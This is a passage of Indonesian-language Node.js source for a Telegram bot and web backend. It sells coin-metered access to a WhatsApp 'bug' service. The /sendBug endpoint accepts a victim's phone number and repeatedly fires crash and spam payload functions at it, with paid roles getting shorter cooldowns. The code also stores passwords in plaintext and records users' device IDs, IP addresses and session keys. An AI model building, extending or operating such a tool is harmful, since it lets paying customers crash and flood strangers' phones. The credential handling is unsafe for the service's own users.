💰 Jumlah: ${amount} coins
⏳ Status: Pending

Silakan tunggu konfirmasi dari admin. Kamu akan mendapat notifikasi jika request disetujui/ditolak.

_Gunakan /canceltopup ${requestId} untuk membatalkan request._`, { parse_mode: "Markdown" });

  // ===== NOTIFIKASI KE OWNER ID SAJA (BUKAN KE GRUP) =====
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${requestId}` },
          { text: "❌ Reject", callback_data: `reject_${requestId}` }
        ]
      ]
    }
  };

  // KIRIM HANYA KE OWNER_ID, BUKAN KE GRUP
  bot.sendMessage(OWNER_ID, `🔔 *REQUEST TOP UP BARU*

📋 Request ID: \`${requestId}\`
👤 Username: *${user.username}*
🆔 Telegram ID: ${userId}
💰 Jumlah: *${amount} coins*
📱 Source: Telegram
⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}

━━━━━━━━━━━━━━━━━━
Klik tombol di bawah untuk approve/reject:`, options);
});

// ===== COMMAND: /checkcoin - Cek saldo coin =====
bot.onText(/^\/checkcoin$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  if (user.coins === undefined) {
    user.coins = 100;
    const db = loadDatabase();
    saveDatabase(db);
  }

  bot.sendMessage(chatId, `💰 *Saldo Coin Kamu*

👤 Username: ${user.username}
🎯 Role: ${user.role || "member"}
💳 Coin: *${user.coins}*
⏳ Expired: ${user.expiredDate}

━━━━━━━━━━━━━━━━━━
💡 Setiap bug membutuhkan 25 coins.
📝 Gunakan /topup <jumlah> untuk top up.
🎁 Gunakan /redeem <kode> untuk redeem coin.`, { parse_mode: "Markdown" });
});

// ===== COMMAND: /canceltopup <requestId> - Cancel request =====
bot.onText(/^\/canceltopup\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const requestId = match[1].toUpperCase();

  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId);

  if (!request) {
    return bot.sendMessage(chatId, "❌ Request ID tidak ditemukan.");
  }

  if (request.status !== "pending") {
    return bot.sendMessage(chatId, `❌ Request sudah diproses dengan status: *${request.status}*`, { parse_mode: "Markdown" });
  }

  if (request.userId !== userId) {
    return bot.sendMessage(chatId, `❌ Request ini bukan milikmu.`);
  }

  // Cancel request
  request.status = "cancelled";
  saveTopupRequests(topupRequests);

  bot.sendMessage(chatId, `✅ Request top up berhasil dibatalkan.\n\n📋 Request ID: \`${requestId}\``, { parse_mode: "Markdown" });
}); // ✅ TUTUP HANDLER INI DENGAN BENAR

// ===== COMMAND: /pendingtopup - Lihat semua request pending =====
bot.onText(/^\/pendingtopup$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const topupRequests = loadTopupRequests();
  const pending = topupRequests.filter(r => r.status === "pending");

  if (pending.length === 0) {
    return bot.sendMessage(chatId, "ℹ️ Tidak ada request top up yang pending.");
  }

  let message = "*📋 DAFTAR TOP UP REQUEST (PENDING)*\n\n";
  
  for (const req of pending) {
    const source = req.source === "app" ? "📱 Mobile App" : "💬 Telegram";
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `📋 Request ID: \`${req.requestId}\`\n`;
    message += `👤 Username: ${req.username}\n`;
    message += `💰 Jumlah: ${req.amount} coins\n`;
    message += `📍 Source: ${source}\n`;
    message += `⏰ Waktu: ${new Date(req.timestamp).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}\n`;
  }

  message += `\n━━━━━━━━━━━━━━━━━━\n`;
  message += `_Total: ${pending.length} request pending_\n\n`;
  message += `Gunakan button approve/reject di notifikasi, atau:\n`;
  message += `/addcoin <requestId> - Approve\n`;
  message += `/rejecttopup <requestId> - Reject`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===== COMMAND: /historytopup - Lihat riwayat top up =====
bot.onText(/^\/historytopup(?:\s+(\S+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1] ? match[1].trim() : null;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const topupRequests = loadTopupRequests();
  let filtered = topupRequests;

  if (username) {
    filtered = topupRequests.filter(r => r.username.toLowerCase() === username.toLowerCase());
    
    if (filtered.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ada riwayat top up untuk user *${username}*.`, { parse_mode: "Markdown" });
    }
  }

  filtered.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  const recent = filtered.slice(0, 20);

  let message = username 
    ? `*📜 RIWAYAT TOP UP: ${username}*\n\n`
    : `*📜 RIWAYAT TOP UP (20 TERAKHIR)*\n\n`;

  for (const req of recent) {
    const statusEmoji = req.status === "approved" ? "✅" : req.status === "rejected" ? "❌" : req.status === "cancelled" ? "🚫" : "⏳";
    const source = req.source === "app" ? "📱 App" : "💬 TG";
    
    message += `${statusEmoji} \`${req.requestId}\` | ${req.username}\n`;
    message += `💰 ${req.amount} coins | ${source} | ${req.status}\n`;
    message += `⏰ ${new Date(req.timestamp).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}\n`;
    
    if (req.processedBy) {
      message += `👮 By: ${req.processedBy}\n`;
    }
    
    message += `━━━━━━━━━━━━━━━━━━\n`;
  }

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===== COMMAND BOT: /redeem <kode> - Redeem code coin =====
bot.onText(/^\/redeem\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const code = match[1].toUpperCase();

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  const redeemCodes = loadRedeemCodes();
  const redeemData = redeemCodes.find(r => r.code === code);

  if (!redeemData) {
    return bot.sendMessage(chatId, "❌ Kode redeem tidak valid!");
  }

  if (redeemData.used) {
    return bot.sendMessage(chatId, `❌ Kode redeem sudah digunakan!

Digunakan oleh: ${redeemData.used_by}
Pada: ${new Date(redeemData.used_at).toLocaleString("id-ID")}`);
  }

  // Validasi role
  const roleHierarchy = {
    member: 1,
    reseller: 2,
    vip: 3,
    owner: 4
  };

  const userRole = user.role || "member";
  const codeRole = redeemData.role;

  if (roleHierarchy[userRole] < roleHierarchy[codeRole]) {
    return bot.sendMessage(chatId, `❌ Kode redeem ini hanya untuk role *${codeRole.toUpperCase()}* atau lebih tinggi!

Role kamu saat ini: *${userRole.toUpperCase()}*`, { parse_mode: "Markdown" });
  }

  // Redeem kode
  const db = loadDatabase();
  if (user.coins === undefined) user.coins = 0;
  
  const oldCoins = user.coins;
  user.coins += redeemData.amount;
  saveDatabase(db);

  // Update status redeem
  redeemData.used = true;
  redeemData.used_by = user.username;
  redeemData.used_at = new Date().toISOString();
  saveRedeemCodes(redeemCodes);

  bot.sendMessage(chatId, `✅ *Redeem Berhasil!*

🎁 Kode: \`${code}\`
🎯 Role: ${codeRole.toUpperCase()}
💰 Kamu mendapat: +${redeemData.amount} coins
💳 Saldo: ${oldCoins} → ${user.coins}

Selamat menikmati!`, { parse_mode: "Markdown" });

  // Log ke group
  sendToGroupsUtama(`🎁 *Kode Redeem Digunakan*

🎟 Kode: \`${code}\`
🎯 Role: ${codeRole.toUpperCase()}
👤 User: ${user.username}
💰 Nilai: ${redeemData.amount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}`, { parse_mode: "Markdown" });

  // Log to file
  const logLine = `${new Date().toISOString()} | REDEEM | ${user.username} redeemed ${code} (${codeRole}) for ${redeemData.amount} coins | Balance: ${oldCoins} → ${user.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);
});

// Command: /listtopup - Lihat semua request pending
bot.onText(/^\/listtopup$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const topupRequests = loadTopupRequests();
  const pending = topupRequests.filter(r => r.status === "pending");

  if (pending.length === 0) {
    return bot.sendMessage(chatId, "ℹ️ Tidak ada request top up yang pending.");
  }

  let message = "*📋 Daftar Top Up Request (Pending)*\n\n";
  
  for (const req of pending) {
    const source = req.source === "app" ? "📱 App" : "💬 Telegram";
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `📋 ID: \`${req.requestId}\`\n`;
    message += `👤 User: ${req.username}\n`;
    message += `💰 Jumlah: ${req.amount} coins\n`;
    message += `📍 Source: ${source}\n`;
    message += `⏰ ${new Date(req.timestamp).toLocaleString("id-ID")}\n`;
  }

  message += `\n━━━━━━━━━━━━━━━━━━\n`;
  message += `_Total: ${pending.length} request_\n\n`;
  message += `*Cara Approve/Reject:*\n`;
  message += `/addcoin <requestId> - Approve\n`;
  message += `/rejecttopup <requestId> - Reject`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});


// Command: /listredeems - Owner only, lihat semua kode redeem
bot.onText(/^\/listredeems$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const redeemCodes = loadRedeemCodes();
  
  if (redeemCodes.length === 0) {
    return bot.sendMessage(chatId, "ℹ️ Belum ada kode redeem yang dibuat.");
  }

  const unused = redeemCodes.filter(r => !r.used);
  const used = redeemCodes.filter(r => r.used);

  let message = `*📋 Daftar Redeem Codes*\n\n`;
  message += `✅ Tersedia: ${unused.length}\n`;
  message += `❌ Terpakai: ${used.length}\n`;
  message += `📊 Total: ${redeemCodes.length}\n\n`;

  if (unused.length > 0) {
    message += `*Kode Tersedia:*\n`;
    
    // Group by role
    const byRole = {};
    unused.forEach(r => {
      if (!byRole[r.role]) byRole[r.role] = [];
      byRole[r.role].push(r);
    });

    for (const [role, codes] of Object.entries(byRole)) {
      message += `\n🎯 *${role.toUpperCase()}* (${codes[0].amount} coins):\n`;
      codes.slice(0, 5).forEach((r, idx) => {
        message += `${idx + 1}. \`${r.code}\`\n`;
      });
      if (codes.length > 5) {
        message += `_...dan ${codes.length - 5} kode lainnya_\n`;
      }
    }
  }

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});


// Command: /addcoin <requestId>
bot.onText(/^\/addcoin\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const requestId = match[1].toUpperCase();
  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

  if (!request) {
    return bot.sendMessage(chatId, "❌ Request ID tidak ditemukan atau sudah diproses.");
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === request.username);

  if (!user) {
    return bot.sendMessage(chatId, "❌ User tidak ditemukan di database.");
  }

  if (user.coins === undefined) user.coins = 0;
  
  const oldCoins = user.coins;
  user.coins += request.amount;
  saveDatabase(db);

  // Update request status
  request.status = "approved";
  request.processedAt = new Date().toISOString();
  request.processedBy = msg.from.username || msg.from.first_name;
  saveTopupRequests(topupRequests);

  // Notify admin (owner ID)
  bot.sendMessage(chatId, `✅ *Top Up Berhasil Diproses*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
💰 Coin: ${oldCoins} → ${user.coins} (+${request.amount})
✓ Status: Approved`, { parse_mode: "Markdown" });

  // Notify user (jika ada telegram ID)
  if (request.userId) {
    try {
      bot.sendMessage(request.userId, `✅ *Top Up Berhasil!*

📋 Request ID: \`${requestId}\`
💰 Jumlah: +${request.amount} coins
💳 Saldo: ${oldCoins} → ${user.coins}

Terima kasih telah melakukan top up!`, { parse_mode: "Markdown" });
    } catch (err) {
      console.log("Gagal kirim notifikasi ke user:", err.message);
    }
  }

  // NOTIFIKASI KE GRUP (HANYA INFO BERHASIL, TANPA BUTTON)
  sendToGroupsUtama(`✅ *Top Up Berhasil*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
💰 Jumlah: ${request.amount} coins
💳 Saldo: ${oldCoins} → ${user.coins}
👮 Diproses oleh: ${request.processedBy}
⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`, { parse_mode: "Markdown" });

  // Log to file
  const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} approved ${request.amount} coins for ${user.username} | Balance: ${oldCoins} → ${user.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);
});

// Command: /rejecttopup <requestId> - Reject topup
bot.onText(/^\/rejecttopup\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const requestId = match[1].toUpperCase();
  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

  if (!request) {
    return bot.sendMessage(chatId, "❌ Request ID tidak ditemukan atau sudah diproses.");
  }

  // Update request status
  request.status = "rejected";
  request.processedAt = new Date().toISOString();
  request.processedBy = msg.from.username || msg.from.first_name;
  saveTopupRequests(topupRequests);

  // Notify admin
  bot.sendMessage(chatId, `❌ *Top Up Ditolak*

📋 Request ID: \`${requestId}\`
👤 Username: ${request.username}
💰 Jumlah: ${request.amount} coins
✗ Status: Rejected`, { parse_mode: "Markdown" });

  // Notify user (jika ada telegram ID)
  if (request.userId) {
    try {
      bot.sendMessage(request.userId, `❌ *Top Up Ditolak*

📋 Request ID: \`${requestId}\`
💰 Jumlah: ${request.amount} coins

Request top up kamu telah ditolak. Silakan hubungi admin untuk informasi lebih lanjut.`, { parse_mode: "Markdown" });
    } catch (err) {
      console.log("Gagal kirim notifikasi ke user:", err.message);
    }
  }

  // Log to group
  sendToGroupsUtama(`❌ *Top Up Ditolak*

📋 Request ID: \`${requestId}\`
👤 Username: ${request.username}
💰 Jumlah: ${request.amount} coins
👮 Ditolak oleh: ${request.processedBy}`, { parse_mode: "Markdown" });

  // Log to file
  const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} rejected ${request.amount} coins for ${request.username}\n`;
  fs.appendFileSync('logTopup.txt', logLine);
});

// Command: /checkcoin (untuk user cek saldo sendiri)
bot.onText(/^\/checkcoin$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  if (user.coins === undefined) {
    user.coins = 100;
    const db = loadDatabase();
    saveDatabase(db);
  }

  bot.sendMessage(chatId, `💰 *Saldo Coin Kamu*

👤 Username: ${user.username}
🎯 Role: ${user.role || "member"}
💳 Coin: ${user.coins}
⏳ Expired: ${user.expiredDate}

💡 Setiap bug membutuhkan 25 coins.
📝 Gunakan /topup <jumlah> untuk top up.
🎁 Gunakan /redeem <kode> untuk redeem coin.`, { parse_mode: "Markdown" });
});

// ===== SISTEM REDEEM CODE =====

// Command: /createredeem <jumlah_coin> <jumlah_kode> - Owner only
// Command: /createredeem <role> <jumlah_kode> - Owner only
bot.onText(/^\/createredeem\s+(member|reseller|vip|owner)\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const role = match[1].toLowerCase();
  const quantity = parseInt(match[2]);

  // Tentukan jumlah coin berdasarkan role
  const coinAmounts = {
    member: 150,
    reseller: 200,
    vip: 300,
    owner: 500
  };

  const coinAmount = coinAmounts[role];

  if (quantity < 1 || quantity > 50) {
    return bot.sendMessage(chatId, "❌ Input tidak valid!\n\nJumlah kode: 1-50");
  }

  const redeemCodes = loadRedeemCodes();
  const newCodes = [];

  for (let i = 0; i < quantity; i++) {
    const code = crypto.randomBytes(6).toString("hex").toUpperCase();
    const redeemData = {
      code,
      role,
      amount: coinAmount,
      created_at: new Date().toISOString(),
      created_by: msg.from.username || msg.from.first_name,
      used: false,
      used_by: null,
      used_at: null
    };
    
    redeemCodes.push(redeemData);
    newCodes.push(code);
  }

  saveRedeemCodes(redeemCodes);

  // Buat file text berisi kode-kode
  const fileName = `redeem_${role}_${Date.now()}.txt`;
  const fileContent = `REDEEM CODES - ${new Date().toLocaleString("id-ID")}
Role: ${role.toUpperCase()}
Jumlah Coin per Kode: ${coinAmount}
Total Kode: ${quantity}
Dibuat oleh: ${msg.from.username || msg.from.first_name}

==========================================

${newCodes.map((code, idx) => `${idx + 1}. ${code}`).join('\n')}

==========================================

Cara pakai: /redeem <kode>`;

  fs.writeFileSync(fileName, fileContent);

  await bot.sendDocument(chatId, fileName, {
    caption: `✅ *Berhasil Membuat ${quantity} Kode Redeem!*

🎯 Role: ${role.toUpperCase()}
💰 Nilai: ${coinAmount} coins per kode
📝 Total: ${quantity} kode

Kode-kode telah disimpan dalam file.`, 
    parse_mode: "Markdown"
  });

  // Hapus file setelah dikirim
  fs.unlinkSync(fileName);

  // Log ke group
  sendToGroupsUtama(`🎁 *Redeem Code Dibuat*

🎯 Role: ${role.toUpperCase()}
💰 Nilai: ${coinAmount} coins
📝 Jumlah: ${quantity} kode
👮 Oleh: ${msg.from.username || msg.from.first_name}`, { parse_mode: "Markdown" });
});

// Command: /deleteredeem <kode> - Owner only, hapus kode redeem
bot.onText(/^\/deleteredeem\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const code = match[1].toUpperCase();
  let redeemCodes = loadRedeemCodes();
  
  const index = redeemCodes.findIndex(r => r.code === code);
  
  if (index === -1) {
    return bot.sendMessage(chatId, "❌ Kode redeem tidak ditemukan!");
  }

  const deleted = redeemCodes[index];
  redeemCodes.splice(index, 1);
  saveRedeemCodes(redeemCodes);

  bot.sendMessage(chatId, `✅ *Kode Redeem Dihapus*

🎟 Kode: \`${code}\`
🎯 Role: ${deleted.role.toUpperCase()}
💰 Nilai: ${deleted.amount} coins
📊 Status: ${deleted.used ? 'Sudah dipakai' : 'Belum dipakai'}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/testcoin\s+(\S+)$/i, async (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  
  const username = match[1];
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  
  if (!user) {
    return bot.sendMessage(msg.chat.id, "❌ User tidak ditemukan");
  }
  
  bot.sendMessage(msg.chat.id, `📊 *Debug Info:*

👤 Username: ${user.username}
🎯 Role: ${user.role}
💰 Coins: ${user.coins ?? "undefined"}
⏳ Expired: ${user.expiredDate}
📝 Has coins field: ${user.hasOwnProperty('coins')}

${!user.coins ? '⚠️ COINS UNDEFINED!' : '✅ Coins OK'}`, { parse_mode: "Markdown" });
});



bot.onText(/^\/?deviceinfo\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("keyList.json")) {
      return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");
    }

    const keys = JSON.parse(fs.readFileSync("keyList.json"));
    const user = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!user) {
      return bot.sendMessage(chatId, `❌ User *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const info = `
*📱 DEVICE INFORMATION*

👤 *Username:* ${user.username}
📱 *Device:* ${user.deviceName || "Unknown"}
🆔 *Android ID:* ${user.androidId}
📍 *IP Address:* ${user.ipAddress}
🔑 *Session Key:* \`${user.sessionKey}\`
⏰ *Last Login:* ${new Date(user.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
    `.trim();

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error deviceinfo:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data device.");
  }
});

bot.onText(/^\/setcoin\s+(\S+)\s+(\d+)$/i, async (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  
  const username = match[1];
  const coins = parseInt(match[2]);
  
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  
  if (!user) {
    return bot.sendMessage(msg.chat.id, "❌ User tidak ditemukan");
  }
  
  user.coins = coins;
  saveDatabase(db);
  
  bot.sendMessage(msg.chat.id, `✅ *Coins Updated!*

👤 Username: ${username}
💰 New Coins: ${coins}

Sekarang:
1. Log in Yo Aplikasi 
2. Coins akan update`, { parse_mode: "Markdown" });
});

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId, deviceName }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  const newRecord = {
    username,
    lastLogin: stamp,
    sessionKey: key,
    ipAddress: ip,
    androidId,
    deviceName: deviceName || "Unknown Device" // Tambahkan device name
  };

  if (idx !== -1) {
    list[idx] = newRecord;
  } else {
    list.push(newRecord);
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/qsw4pk.mp4",
    title: "Glacier - Xx Release",
    desc: "Buy Acces Chat @Gaaa25"
  }
];

// ✅ THANKS TO SUPPORTERS (TELEGRAM VERSION)
const supporters = [
  {
    username: "GaxTamvan",
    role: "THE DEVELOPER",
    avatar: "https://files.catbox.moe/fkfs6y.jpg",
    link: "https://t.me/GaxHaveMe25"
  },
  {
    username: "HanzyPler",
    role: "MY FRIEND",
    avatar: "https://files.catbox.moe/5rpxpv.jpg",
    link: "https://t.me/hanzzy444"
  },
  {
    username: "AxataPler",
    role: "MY MURBASE",
    avatar: "https://files.catbox.moe/fkfs6y.jpg",
    link: "https://t.me/BlrezaXaxata"
  },
  {
    username: "ArSenzPler",
    role: "DEV 2 VENOM",
    avatar: "https://files.catbox.moe/8fl8ou.jpg",
    link: "https://t.me/Kinksenzy"
  },
  {
    username: "UbayKuatNgocok",
    role: "BEST FRIEND",
    avatar: "https://files.catbox.moe/3s6chy.jpg",
    link: "https://t.me/Ubaymd_Reals1"
  }
];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", async (req, res) => {
  const { username, password, version, androidId, deviceName } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false, message: "Invalid credentials" });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // ===== 🔥 CEK DEVICE CONFLICT =====
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession && existingSession.androidId && existingSession.androidId !== androidId) {
    // ❌ Device berbeda terdeteksi!
    const oldDevice = {
      model: existingSession.deviceName || "Unknown Device",
      androidId: existingSession.androidId
    };
    const newDevice = {
      model: deviceName || "Unknown Device",
      androidId: androidId
    };
    const ipAddress = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;

    // Kirim notifikasi ke Telegram
    await sendDeviceConflictNotification(username, oldDevice, newDevice, ipAddress);

    console.log(`[🚨 DEVICE CONFLICT] ${username} trying to login from different device!`);
    console.log(`   Old: ${oldDevice.model} (${oldDevice.androidId})`);
    console.log(`   New: ${newDevice.model} (${newDevice.androidId})`);
    console.log(`   IP: ${ipAddress}`);

    // 🔥 RETURN DEVICE CONFLICT ERROR
    return res.json({
      valid: false,
      deviceConflict: true,
      loggedDevice: oldDevice.model,
      message: "Another device is already logged in with this account."
    });
  }

  // ✅ Generate key baru & override session lama
  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
    deviceName: deviceName || "Unknown Device"
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listBugGroup: bugGroup, 
    listBugsCustom: bugscustom,
    news,
    supporters: supporters,
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  
  console.log("\n=== 🔍 DEBUG MYINFO ===");
  console.log("Username:", username);
  console.log("Key:", key);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  
  if (!user) {
    console.log("❌ User not found");
    return res.json({ valid: false });
  }

  // ✅ PENTING: Pastikan coins ada
  if (user.coins === undefined || user.coins === null) {
    console.log("⚠️ Coins undefined, setting to 100");
    user.coins = 100;
    saveDatabase(db);
  }

  console.log("✅ User Data:");
  console.log("  - Username:", user.username);
  console.log("  - Role:", user.role);
  console.log("  - Coins:", user.coins); // ⚠️ CEK INI
  console.log("  - Expired:", user.expiredDate);

  const response = {
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    coins: user.coins, // ✅ KIRIM COINS
    listBug: bugs,
    listBugGroup: bugGroup, 
    listBugsCustom: bugscustom,
    news: news,
    supporters: supporters,
  };

  console.log("📤 Response Coins:", response.coins);
  console.log("======================\n");

  return res.json(response);
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// Utility functions
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    vip: 10,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const attemptSend = async (sock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
          case "click":
            for (let i = 0; i < 100; i++) {
              await odx(sock, targetJid);
              await odx(sock, targetJid);
              await odx(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await sleep(100);
            }
            break;
          case "crash_spam":
            for (let i = 0; i < 100; i++) {
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await EpstainFcCall(sock, targetJid);
              await sleep(100);
            }
            break;
          case "hard":
            for (let i = 0; i < 100; i++) {
              await HardCore(sock, targetJid);
              await HardCore(sock, targetJid);
              await HardCore(sock, targetJid);
              await HardCore(sock, targetJid);
              await HardCore(sock, targetJid);
              await HardCore(sock, targetJid);
              await HardCore(sock, targetJid);
